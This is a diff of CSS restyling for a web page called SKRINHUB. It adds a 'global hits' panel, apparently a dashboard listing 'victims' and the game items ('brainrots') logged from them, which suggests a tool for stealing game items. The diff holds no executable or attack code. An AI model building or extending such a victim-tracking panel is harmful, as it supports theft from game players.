@@ -6,11 +6,7 @@
 <title>SKRINHUB</title>
 <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
-  *, *::before, *::after {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
   :root {
     --bg: #0a0a0a;
@@ -18,7 +14,7 @@
     --panel: #1e1e1e;
     --border: #333;
     --neon: #ffffff;
-    --neon-glow: 0 0 10px rgba(255, 255, 255, 0.8);
+    --neon-glow: 0 0 10px rgba(255,255,255,0.8);
     --text: #e0e0e0;
     --muted: #888;
     --danger: #ff4444;
@@ -39,14 +35,14 @@
     position: fixed;
     inset: 0;
     background-image:
-      radial-gradient(1px 1px at 10px 10px, rgba(255, 255, 255, 0.9), transparent),
-      radial-gradient(1px 1px at 30px 20px, rgba(255, 255, 255, 0.7), transparent),
-      radial-gradient(1px 1px at 50px 40px, rgba(255, 255, 255, 1), transparent),
-      radial-gradient(1px 1px at 70px 10px, rgba(255, 255, 255, 0.8), transparent),
-      radial-gradient(1px 1px at 90px 30px, rgba(255, 255, 255, 0.6), transparent),
-      radial-gradient(1px 1px at 110px 50px, rgba(255, 255, 255, 0.9), transparent),
-      radial-gradient(1px 1px at 130px 20px, rgba(255, 255, 255, 0.7), transparent),
-      radial-gradient(1px 1px at 150px 40px, rgba(255, 255, 255, 1), transparent);
+      radial-gradient(1px 1px at 10px 10px, rgba(255,255,255,0.9), transparent),
+      radial-gradient(1px 1px at 30px 20px, rgba(255,255,255,0.7), transparent),
+      radial-gradient(1px 1px at 50px 40px, rgba(255,255,255,1), transparent),
+      radial-gradient(1px 1px at 70px 10px, rgba(255,255,255,0.8), transparent),
+      radial-gradient(1px 1px at 90px 30px, rgba(255,255,255,0.6), transparent),
+      radial-gradient(1px 1px at 110px 50px, rgba(255,255,255,0.9), transparent),
+      radial-gradient(1px 1px at 130px 20px, rgba(255,255,255,0.7), transparent),
+      radial-gradient(1px 1px at 150px 40px, rgba(255,255,255,1), transparent);
     background-size: 200px 200px;
     pointer-events: none;
     z-index: 0;
@@ -54,8 +50,8 @@
   }
 
   @keyframes float {
-    0% { transform: translate(0, 0); }
-    100% { transform: translate(100px, 100px); }
+    from { transform: translate(0,0); }
+    to { transform: translate(100px,100px); }
   }
 
   .wrap {
@@ -64,134 +60,6 @@
     max-width: 920px;
     margin: 0 auto;
     padding: 2.8rem 1.5rem 6rem;
-  }
-
-  .badge-og {
-    font-size: 10px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    padding: 2px 6px;
-    border-radius: 4px;
-    background: rgba(255, 255, 255, 0.1);
-    color: var(--neon);
-    border: 1px solid var(--neon);
-    margin-left: 8px;
-    cursor: default;
-    text-shadow: var(--neon-glow);
-  }
-
-  .badge-secret {
-    font-size: 10px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    padding: 2px 6px;
-    border-radius: 4px;
-    background: rgba(255, 255, 255, 0.05);
-    color: var(--text);
-    border: 1px solid rgba(255, 255, 255, 0.2);
-    margin-left: 8px;
-    cursor: default;
-  }
-
-  .badge-mythic {
-    font-size: 10px;
-    font-weight: bold;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    padding: 2px 6px;
-    border-radius: 4px;
-    background: rgba(180, 100, 255, 0.15);
-    color: #c97fff;
-    border: 1px solid rgba(180, 100, 255, 0.4);
-    margin-left: 8px;
-    cursor: default;
-  }
-
-  .suggestions-container {
-    position: absolute;
-    bottom: 100%;
-    left: 0;
-    right: 0;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    margin-bottom: 8px;
-    max-height: 380px;
-    overflow-y: auto;
-    z-index: 100;
-    display: none;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-  }
-
-  #usernameSuggestions {
-    position: absolute;
-    bottom: 100%;
-    left: 0;
-    right: 0;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    margin-bottom: 8px;
-    max-height: 380px;
-    overflow-y: auto;
-    z-index: 100;
-    display: none;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
-  }
-
-  .suggestion-item {
-    padding: 12px 14px;
-    cursor: pointer;
-    transition: background 0.2s;
-    display: flex;
-    align-items: center;
-    gap: 14px;
-  }
-
-  .suggestion-item:hover {
-    background: rgba(255, 255, 255, 0.05);
-  }
-
-  .suggestion-avatar {
-    width: 42px;
-    height: 42px;
-    border-radius: 50%;
-    background: rgba(255, 255, 255, 0.05);
-    overflow: hidden;
-    flex-shrink: 0;
-    border: 2px solid var(--neon);
-  }
-
-  .suggestion-avatar img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
-  }
-
-  .suggestion-info {
-    flex: 1;
-    min-width: 0;
-  }
-
-  .suggestion-username {
-    color: var(--text);
-    font-size: 0.95rem;
-    font-weight: 600;
-  }
-
-  .suggestion-handle {
-    color: var(--neon);
-    font-size: 0.82rem;
-    font-weight: 500;
-    text-shadow: var(--neon-glow);
-  }
-
-  .suggestion-id {
-    color: rgba(255, 255, 255, 0.5);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.78rem;
   }
 
   header {
@@ -207,22 +75,14 @@
     gap: 1rem;
     margin-bottom: 0.5rem;
   }
-
-  .logo-row::before,
-  .logo-row::after {
+  .logo-row::before, .logo-row::after {
     content: '';
     flex: 1;
     height: 1px;
     max-width: 160px;
   }
-
-  .logo-row::before {
-    background: linear-gradient(to right, transparent, var(--neon));
-  }
-
-  .logo-row::after {
-    background: linear-gradient(to left, transparent, var(--neon));
-  }
+  .logo-row::before { background: linear-gradient(to right, transparent, var(--neon)); }
+  .logo-row::after  { background: linear-gradient(to left, transparent, var(--neon)); }
 
   h1 {
     font-size: clamp(1.9rem, 4.5vw, 3rem);
@@ -243,6 +103,7 @@
     margin-top: 0.4rem;
   }
 
+  /* PANELS */
   .panel {
     background: var(--panel);
     border: 1px solid var(--border);
@@ -250,9 +111,8 @@
     overflow: hidden;
     margin-bottom: 1.2rem;
     animation: fadeUp 0.5s ease both;
-    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
   }
-
   .panel:nth-child(1) { animation-delay: 0.05s; }
   .panel:nth-child(2) { animation-delay: 0.13s; }
   .panel:nth-child(3) { animation-delay: 0.21s; }
@@ -269,19 +129,16 @@
   }
 
   .dot {
-    width: 7px;
-    height: 7px;
+    width: 7px; height: 7px;
     border-radius: 50%;
     flex-shrink: 0;
     animation: blink 2.2s infinite;
     box-shadow: var(--neon-glow);
   }
-
-  .dot-cyan { background: var(--neon); }
-  .dot-purple { background: var(--neon); animation-delay: 0.4s; }
+  .dot-cyan    { background: var(--neon); }
+  .dot-purple  { background: var(--neon); animation-delay: 0.4s; }
   .dot-discord { background: var(--neon); animation-delay: 0.8s; }
-  .dot-green { background: var(--green); animation-delay: 1.2s; }
-  .dot-hit { background: #ff9900; animation-delay: 0.6s; box-shadow: 0 0 10px rgba(255, 153, 0, 0.8); }
+  .dot-green   { background: var(--green); animation-delay: 1.2s; box-shadow: 0 0 10px rgba(0,255,136,0.8); }
 
   .ph-title {
     font-family: 'Share Tech Mono', monospace;
@@ -290,15 +147,6 @@
     letter-spacing: 0.15em;
     color: var(--neon);
     text-shadow: var(--neon-glow);
-  }
-
-  .ph-title-hit {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: #ff9900;
-    text-shadow: 0 0 10px rgba(255, 153, 0, 0.8);
   }
 
   .pb { padding: 1.25rem; }
@@ -331,17 +179,12 @@
     outline: none;
     transition: border-color 0.2s, box-shadow 0.2s;
   }
-
-  .search-input:focus {
-    border-color: var(--neon);
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-  }
-
+  .search-input:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
   .search-input::placeholder { color: var(--muted); }
 
   .btn-sm {
     padding: 0.5rem 0.9rem;
-    background: rgba(255, 255, 255, 0.1);
+    background: rgba(255,255,255,0.1);
     border: 1px solid var(--neon);
     border-radius: 7px;
     color: var(--neon);
@@ -354,33 +197,16 @@
     transition: background 0.2s, color 0.2s;
     text-shadow: var(--neon-glow);
   }
-
-  .btn-sm:hover {
-    background: rgba(255, 255, 255, 0.2);
-    color: var(--text);
-  }
+  .btn-sm:hover { background: rgba(255,255,255,0.2); color: var(--text); }
+  .btn-sm:disabled { opacity: 0.5; cursor: default; }
 
   .btn-sm.red {
     color: var(--danger);
-    border-color: rgba(255, 68, 68, 0.5);
-    background: rgba(255, 68, 68, 0.1);
+    border-color: rgba(255,68,68,0.5);
+    background: rgba(255,68,68,0.1);
+    text-shadow: none;
   }
-
-  .btn-sm.red:hover {
-    background: rgba(255, 68, 68, 0.2);
-    color: var(--text);
-  }
-
-  .btn-sm.orange {
-    color: #ff9900;
-    border-color: rgba(255, 153, 0, 0.5);
-    background: rgba(255, 153, 0, 0.1);
-    text-shadow: 0 0 10px rgba(255, 153, 0, 0.8);
-  }
-
-  .btn-sm.orange:hover {
-    background: rgba(255, 153, 0, 0.2);
-  }
+  .btn-sm.red:hover { background: rgba(255,68,68,0.2); color: var(--text); }
 
   .animal-list {
     background: var(--surface);
@@ -391,12 +217,8 @@
     scrollbar-width: thin;
     scrollbar-color: var(--neon) transparent;
   }
-
   .animal-list::-webkit-scrollbar { width: 4px; }
-  .animal-list::-webkit-scrollbar-thumb {
-    background: var(--neon);
-    border-radius: 4px;
-  }
+  .animal-list::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 4px; }
 
   .a-item {
     display: flex;
@@ -404,20 +226,18 @@
     gap: 0.65rem;
     padding: 0.48rem 0.9rem;
     cursor: pointer;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    border-bottom: 1px solid rgba(255,255,255,0.03);
     transition: background 0.12s;
     user-select: none;
   }
-
   .a-item:last-child { border-bottom: none; }
-  .a-item:hover { background: rgba(255, 255, 255, 0.05); }
-  .a-item.on { background: rgba(255, 255, 255, 0.1); }
+  .a-item:hover { background: rgba(255,255,255,0.05); }
+  .a-item.on { background: rgba(255,255,255,0.1); }
 
   .a-item input[type="checkbox"] {
     -webkit-appearance: none;
     appearance: none;
-    width: 13px;
-    height: 13px;
+    width: 13px; height: 13px;
     border: 1px solid var(--neon);
     border-radius: 3px;
     background: var(--surface);
@@ -427,52 +247,46 @@
     outline: none;
     transition: background 0.2s, border-color 0.2s;
   }
-
   .a-item input[type="checkbox"]:checked {
     background: var(--neon);
     border-color: var(--neon);
     box-shadow: var(--neon-glow);
   }
-
   .a-item input[type="checkbox"]:checked::after {
     content: '✓';
     position: absolute;
     color: black;
     font-size: 8px;
     font-weight: bold;
-    top: 50%;
-    left: 50%;
+    top: 50%; left: 50%;
     transform: translate(-50%, -55%);
   }
 
-  .a-name {
-    font-size: 0.88rem;
-    line-height: 1.2;
-    flex: 1;
-    color: var(--text);
+  .a-name { font-size: 0.88rem; line-height: 1.2; flex: 1; color: var(--text); }
+  .a-meta { font-family: 'Share Tech Mono', monospace; font-size: 0.68rem; color: var(--muted); text-align: right; min-width: 100px; }
+
+  .badge-og {
+    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 6px; border-radius: 4px;
+    background: rgba(255,255,255,0.1); color: var(--neon);
+    border: 1px solid var(--neon); margin-left: 8px; cursor: default;
+    text-shadow: var(--neon-glow);
+  }
+  .badge-secret {
+    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 6px; border-radius: 4px;
+    background: rgba(255,255,255,0.05); color: var(--text);
+    border: 1px solid rgba(255,255,255,0.2); margin-left: 8px; cursor: default;
+  }
+  .badge-mythic {
+    font-size: 10px; font-weight: bold; text-transform: uppercase; letter-spacing: 1px;
+    padding: 2px 6px; border-radius: 4px;
+    background: rgba(180,100,255,0.15); color: #c97fff;
+    border: 1px solid rgba(180,100,255,0.4); margin-left: 8px; cursor: default;
   }
 
-  .a-meta {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    color: var(--muted);
-    text-align: right;
-    min-width: 100px;
-  }
-
-  .meta-row {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-top: 0.6rem;
-  }
-
-  .sel-count {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.7rem;
-    color: var(--muted);
-  }
-
+  .meta-row { display: flex; justify-content: space-between; align-items: center; margin-top: 0.6rem; }
+  .sel-count { font-family: 'Share Tech Mono', monospace; font-size: 0.7rem; color: var(--muted); }
   .sel-count span { color: var(--neon); }
 
   .txt {
@@ -487,432 +301,277 @@
     outline: none;
     transition: border-color 0.2s, box-shadow 0.2s;
   }
-
-  .txt:focus {
-    border-color: var(--neon);
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-  }
-
+  .txt:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
   .txt::placeholder { color: var(--muted); }
 
-  .hint {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.67rem;
-    color: var(--muted);
-    margin-top: 0.4rem;
-  }
-
+  .hint { font-family: 'Share Tech Mono', monospace; font-size: 0.67rem; color: var(--muted); margin-top: 0.4rem; }
   .error { color: var(--danger) !important; font-weight: bold; }
 
   .btn-gen {
-    display: block;
-    width: 100%;
+    display: block; width: 100%;
     padding: 0.92rem;
     background: var(--neon);
-    border: none;
-    border-radius: 10px;
+    border: none; border-radius: 10px;
     color: black;
     font-family: 'Rajdhani', sans-serif;
-    font-size: 1.1rem;
-    font-weight: 700;
-    letter-spacing: 0.14em;
-    text-transform: uppercase;
+    font-size: 1.1rem; font-weight: 700;
+    letter-spacing: 0.14em; text-transform: uppercase;
     cursor: pointer;
     transition: all 0.2s;
     box-shadow: var(--neon-glow);
     margin-bottom: 1.2rem;
   }
-
-  .btn-gen:hover {
-    box-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
-    transform: translateY(-1px);
-  }
-
+  .btn-gen:hover { box-shadow: 0 0 20px rgba(255,255,255,0.7); transform: translateY(-1px); }
   .btn-gen:active { transform: none; }
 
   .out-ph {
-    display: flex;
-    align-items: center;
-    gap: 0.6rem;
+    display: flex; align-items: center; gap: 0.6rem;
     padding: 0.75rem 1.25rem;
     background: var(--surface);
     border-bottom: 1px solid var(--border);
   }
-
   .out-ph-title {
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.72rem;
-    text-transform: uppercase;
-    letter-spacing: 0.15em;
-    color: var(--neon);
-    text-shadow: var(--neon-glow);
+    font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.15em;
+    color: var(--neon); text-shadow: var(--neon-glow);
   }
 
   .btn-copy {
     margin-left: auto;
     padding: 0.26rem 0.7rem;
-    background: rgba(255, 255, 255, 0.1);
-    border: 1px solid var(--neon);
-    border-radius: 6px;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid var(--neon); border-radius: 6px;
     color: var(--neon);
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.1em;
-    cursor: pointer;
-    transition: all 0.2s;
-    text-shadow: var(--neon-glow);
+    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.1em;
+    cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow);
   }
-
-  .btn-copy:hover { background: rgba(255, 255, 255, 0.2); }
-  .btn-copy.ok {
-    color: var(--green);
-    border-color: var(--green);
-    background: rgba(0, 255, 136, 0.1);
-  }
+  .btn-copy:hover { background: rgba(255,255,255,0.2); }
+  .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(0,255,136,0.1); }
 
   .code-block {
     background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
+    border: 1px solid var(--border); border-radius: 8px;
     padding: 1rem 1.2rem;
     font-family: 'Share Tech Mono', monospace;
-    font-size: 0.79rem;
-    line-height: 1.8;
+    font-size: 0.79rem; line-height: 1.8;
     color: var(--text);
-    min-height: 120px;
-    max-height: 480px;
-    overflow-y: auto;
-    white-space: pre;
-    overflow-x: auto;
-    scrollbar-width: thin;
-    scrollbar-color: var(--border) transparent;
+    min-height: 120px; max-height: 480px;
+    overflow-y: auto; white-space: pre; overflow-x: auto;
+    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+  }
+  .code-block.empty { color: var(--muted); font-style: italic; white-space: pre-wrap; }
+
+  .admin-mode-selector { display: flex; gap: 0.5rem; margin-bottom: 1rem; }
+  .admin-mode-btn {
+    flex: 1; padding: 0.5rem;
+    background: rgba(255,255,255,0.1);
+    border: 1px solid var(--neon); border-radius: 7px;
+    color: var(--neon);
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em;
+    cursor: pointer; transition: all 0.2s; text-shadow: var(--neon-glow);
+  }
+  .admin-mode-btn.active { background: var(--neon); color: black; border-color: var(--neon); box-shadow: var(--neon-glow); }
+  .admin-mode-btn:hover:not(.active) { background: rgba(255,255,255,0.2); }
+
+  #customAdminInput { display: none; margin-top: 1rem; }
+
+  #customBrainrotInput {
+    display: flex; gap: 0.5rem; margin-top: 1rem;
+  }
+  #customBrainrotInput input {
+    flex: 1; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 7px; padding: 0.55rem 0.85rem;
+    color: var(--text); font-family: 'Share Tech Mono', monospace; font-size: 0.82rem; outline: none;
+  }
+  #customBrainrotInput button {
+    padding: 0.5rem 0.9rem; background: rgba(255,255,255,0.1);
+    border: 1px solid var(--neon); border-radius: 7px; color: var(--neon);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.68rem;
+    text-transform: uppercase; letter-spacing: 0.08em; cursor: pointer; white-space: nowrap;
+    text-shadow: var(--neon-glow);
   }
 
-  .code-block.empty {
-    color: var(--muted);
-    font-style: italic;
-    white-space: pre-wrap;
+  #pasteCustomListContainer { margin-top: 1rem; }
+  #pasteCustomListContainer textarea {
+    width: 100%; background: var(--surface); border: 1px solid var(--border);
+    border-radius: 8px; padding: 0.72rem 1rem; color: var(--text);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.88rem;
+    min-height: 100px; resize: vertical; outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
   }
+  #pasteCustomListContainer textarea:focus { border-color: var(--neon); box-shadow: 0 0 10px rgba(255,255,255,0.5); }
+  #pasteCustomListContainer button {
+    margin-top: 0.5rem; padding: 0.5rem 0.9rem;
+    background: rgba(255,255,255,0.1); border: 1px solid var(--neon);
+    border-radius: 7px; color: var(--neon); font-family: 'Share Tech Mono', monospace;
+    font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.08em;
+    cursor: pointer; white-space: nowrap; text-shadow: var(--neon-glow);
+  }
+
+  /* username suggestions */
+  #usernameSuggestions {
+    position: absolute; bottom: 100%; left: 0; right: 0;
+    background: var(--surface); border: 1px solid var(--border); border-radius: 8px;
+    margin-bottom: 8px; max-height: 380px; overflow-y: auto;
+    z-index: 100; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+  }
+  .suggestion-item { padding: 12px 14px; cursor: pointer; transition: background 0.2s; display: flex; align-items: center; gap: 14px; }
+  .suggestion-item:hover { background: rgba(255,255,255,0.05); }
+  .suggestion-avatar { width: 42px; height: 42px; border-radius: 50%; background: rgba(255,255,255,0.05); overflow: hidden; flex-shrink: 0; border: 2px solid var(--neon); }
+  .suggestion-avatar img { width: 100%; height: 100%; object-fit: cover; }
+  .suggestion-info { flex: 1; min-width: 0; }
+  .suggestion-username { color: var(--text); font-size: 0.95rem; font-weight: 600; }
+  .suggestion-handle { color: var(--neon); font-size: 0.82rem; font-weight: 500; text-shadow: var(--neon-glow); }
+  .suggestion-id { color: rgba(255,255,255,0.5); font-family: 'Share Tech Mono', monospace; font-size: 0.78rem; }
+
+  /* ── GLOBAL HITS ── */
+  .hits-panel { border-color: var(--border); }
+
+  .hits-header {
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 0.75rem 1.25rem;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+  }
+
+  .hits-badge {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
+    padding: 2px 8px; border-radius: 20px;
+    background: rgba(255,255,255,0.07);
+    border: 1px solid rgba(255,255,255,0.2);
+    color: var(--neon);
+  }
+
+  .hits-actions { margin-left: auto; display: flex; align-items: center; gap: 0.5rem; }
+
+  .api-url-row {
+    display: flex; align-items: center; gap: 0.5rem;
+    padding: 0.65rem 1.25rem;
+    background: rgba(0,0,0,0.3);
+    border-bottom: 1px solid rgba(255,255,255,0.05);
+  }
+  .api-url-row label {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
+    text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted);
+    white-space: nowrap; flex-shrink: 0;
+  }
+  .api-url-row input {
+    flex: 1; background: transparent;
+    border: none; border-bottom: 1px solid var(--border);
+    color: var(--text); font-family: 'Share Tech Mono', monospace;
+    font-size: 0.72rem; outline: none; padding: 0.1rem 0.3rem;
+    transition: border-color 0.2s;
+  }
+  .api-url-row input:focus { border-color: var(--neon); }
+  .api-url-row input::placeholder { color: var(--muted); }
+  .api-url-status {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
+    padding: 2px 7px; border-radius: 4px;
+    white-space: nowrap; flex-shrink: 0;
+  }
+  .api-url-status.ok  { color: var(--green); background: rgba(0,255,136,0.08); border: 1px solid rgba(0,255,136,0.25); }
+  .api-url-status.err { color: var(--danger); background: rgba(255,68,68,0.08); border: 1px solid rgba(255,68,68,0.25); }
+  .api-url-status.checking { color: var(--muted); background: rgba(255,255,255,0.05); border: 1px solid var(--border); }
+
+  .hits-list {
+    max-height: 400px; overflow-y: auto;
+    scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+  }
+  .hits-list::-webkit-scrollbar { width: 4px; }
+  .hits-list::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+  .hit-entry {
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    padding: 0.9rem 1.25rem;
+    animation: fadeUp 0.3s ease both;
+  }
+  .hit-entry:last-child { border-bottom: none; }
+
+  .hit-entry-header {
+    display: flex; align-items: center; gap: 0.7rem;
+    margin-bottom: 0.6rem;
+  }
+
+  .hit-victim {
+    font-size: 1rem; font-weight: 700;
+    color: var(--neon);
+    text-shadow: var(--neon-glow);
+    letter-spacing: 0.05em;
+  }
+
+  .hit-total-mps {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
+    color: var(--green);
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    padding: 2px 8px;
+    border: 1px solid rgba(0,255,136,0.3);
+    border-radius: 4px;
+    background: rgba(0,255,136,0.06);
+  }
+
+  .hit-time {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.62rem;
+    color: var(--muted); margin-left: auto;
+  }
+
+  .hit-brainrots { display: flex; flex-wrap: wrap; gap: 0.3rem; }
+
+  .hit-tag {
+    font-family: 'Share Tech Mono', monospace; font-size: 0.65rem;
+    padding: 2px 7px; border-radius: 4px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid rgba(255,255,255,0.1);
+    color: var(--text);
+    display: flex; align-items: center; gap: 4px;
+  }
+  .hit-tag.tag-og { background: rgba(255,255,255,0.07); border-color: rgba(255,255,255,0.35); color: var(--neon); }
+  .hit-tag.tag-mythic { background: rgba(180,100,255,0.08); border-color: rgba(180,100,255,0.3); color: #c97fff; }
+  .hit-tag .tag-mps { color: var(--muted); font-size: 0.6rem; }
+
+  .hits-empty {
+    padding: 2.5rem 1.25rem; text-align: center;
+    font-family: 'Share Tech Mono', monospace; font-size: 0.72rem;
+    color: var(--muted); letter-spacing: 0.06em; line-height: 1.8;
+  }
+  .hits-empty-icon { font-size: 1.8rem; margin-bottom: 0.5rem; opacity: 0.35; }
+
+  .auto-refresh-row {
+    display: flex; align-items: center; gap: 0.6rem;
+    padding: 0.55rem 1.25rem;
+    background: rgba(0,0,0,0.2);
+    border-top: 1px solid rgba(255,255,255,0.04);
+    font-family: 'Share Tech Mono', monospace; font-size: 0.63rem; color: var(--muted);
+  }
+  .auto-refresh-toggle {
+    -webkit-appearance: none; appearance: none;
+    width: 28px; height: 15px; border-radius: 10px;
+    background: var(--border); cursor: pointer; position: relative; transition: background 0.2s;
+    flex-shrink: 0;
+  }
+  .auto-refresh-toggle:checked { background: var(--neon); }
+  .auto-refresh-toggle::after {
+    content: ''; position: absolute;
+    width: 11px; height: 11px; border-radius: 50%;
+    background: white; top: 2px; left: 2px; transition: left 0.2s;
+  }
+  .auto-refresh-toggle:checked::after { left: 15px; }
+
+  .spin { display: inline-block; animation: spin 0.8s linear infinite; }
+  @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
   @keyframes fadeDown {
     from { opacity: 0; transform: translateY(-16px); }
     to { opacity: 1; transform: none; }
   }
-
   @keyframes fadeUp {
     from { opacity: 0; transform: translateY(16px); }
     to { opacity: 1; transform: none; }
   }
-
   @keyframes blink {
     0%, 100% { opacity: 1; }
     50% { opacity: 0.3; }
-  }
-
-  .admin-mode-selector {
-    display: flex;
-    gap: 0.5rem;
-    margin-bottom: 1rem;
-  }
-
-  .admin-mode-btn {
-    flex: 1;
-    padding: 0.5rem;
-    background: rgba(255, 255, 255, 0.1);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    transition: all 0.2s;
-    text-shadow: var(--neon-glow);
-  }
-
-  .admin-mode-btn.active {
-    background: var(--neon);
-    color: black;
-    border-color: var(--neon);
-    box-shadow: var(--neon-glow);
-  }
-
-  .admin-mode-btn:hover:not(.active) {
-    background: rgba(255, 255, 255, 0.2);
-  }
-
-  #customAdminInput {
-    display: none;
-    margin-top: 1rem;
-  }
-
-  #customBrainrotInput {
-    display: flex;
-    gap: 0.5rem;
-    margin-top: 1rem;
-  }
-
-  #customBrainrotInput input {
-    flex: 1;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 7px;
-    padding: 0.55rem 0.85rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.82rem;
-    outline: none;
-  }
-
-  #customBrainrotInput button {
-    padding: 0.5rem 0.9rem;
-    background: rgba(255, 255, 255, 0.1);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    white-space: nowrap;
-    text-shadow: var(--neon-glow);
-  }
-
-  #pasteCustomListContainer {
-    margin-top: 1rem;
-  }
-
-  #pasteCustomListContainer textarea {
-    width: 100%;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    border-radius: 8px;
-    padding: 0.72rem 1rem;
-    color: var(--text);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.88rem;
-    min-height: 100px;
-    resize: vertical;
-    outline: none;
-    transition: border-color 0.2s, box-shadow 0.2s;
-  }
-
-  #pasteCustomListContainer textarea:focus {
-    border-color: var(--neon);
-    box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
-  }
-
-  #pasteCustomListContainer button {
-    margin-top: 0.5rem;
-    padding: 0.5rem 0.9rem;
-    background: rgba(255, 255, 255, 0.1);
-    border: 1px solid var(--neon);
-    border-radius: 7px;
-    color: var(--neon);
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.68rem;
-    text-transform: uppercase;
-    letter-spacing: 0.08em;
-    cursor: pointer;
-    white-space: nowrap;
-    text-shadow: var(--neon-glow);
-  }
-
-  /* ── GLOBAL HITS ── */
-
-  .hits-panel {
-    border-color: rgba(255, 153, 0, 0.35);
-    box-shadow: 0 4px 20px rgba(255, 153, 0, 0.08);
-  }
-
-  .hits-header {
-    display: flex;
-    align-items: center;
-    gap: 0.6rem;
-    padding: 0.75rem 1.25rem;
-    background: var(--surface);
-    border-bottom: 1px solid rgba(255, 153, 0, 0.2);
-  }
-
-  .hits-actions {
-    margin-left: auto;
-    display: flex;
-    align-items: center;
-    gap: 0.5rem;
-  }
-
-  .hits-count-badge {
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 0.65rem;
-    padding: 2px 7px;
-    border-radius: 20px;
-    background: rgba(255, 153, 0, 0.15);
-    border: 1px solid rgba(255, 153, 0, 0.4);
-    color: #ff9900;
-  }
-
-  .hits-list {
-    max-height: 480px;
-    overflow-y: auto;
-    scrollbar-width: thin;
-    scrollbar-color: rgba(255, 153, 0, 0.4) transparent;
-  }
-
-  .hits-list::-webkit-scrollbar { width: 4px; }
-  .hits-list::-webkit-scrollbar-thumb {
-    background: rgba(255, 153, 0, 0.4);
-    border-radius: 4px;
-  }
-
-  .hit-entry {
-    border-bottom: 1px solid rgba(255, 255, 255, 0.04);
-    padding: 1rem 1.25rem;
-    animation: fadeUp 0.3s ease both;
-  }
-
-  .hit-entry:last-child { border-bottom: none; }
-
-  .hit-entry-header {
-    display: flex;
-    align-items: center;
-    gap: 0.7rem;
-    margin-bottom: 0.7rem;
-  }
-
-  .hit-victim {
-    font-size: 1rem;
-    font-weight: 700;
-    color: #ff9900;
-    letter-spacing: 0.05em;
